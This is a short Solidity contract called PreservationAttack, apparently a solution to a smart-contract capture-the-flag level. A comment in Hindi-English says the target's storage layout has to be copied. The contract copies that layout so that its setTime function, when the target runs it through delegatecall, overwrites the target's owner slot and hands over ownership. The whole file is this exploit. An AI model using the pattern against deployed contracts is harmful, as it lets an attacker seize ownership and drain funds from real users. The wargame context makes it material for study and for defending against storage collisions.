// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // Target contract ka storage layout copy karna zaroori hai
    address public slot1;
    address public slot2;
    address public owner;

    function setTime(uint256 _ownerAddress) public {
        owner = address(uint160(_ownerAddress));
    }
}
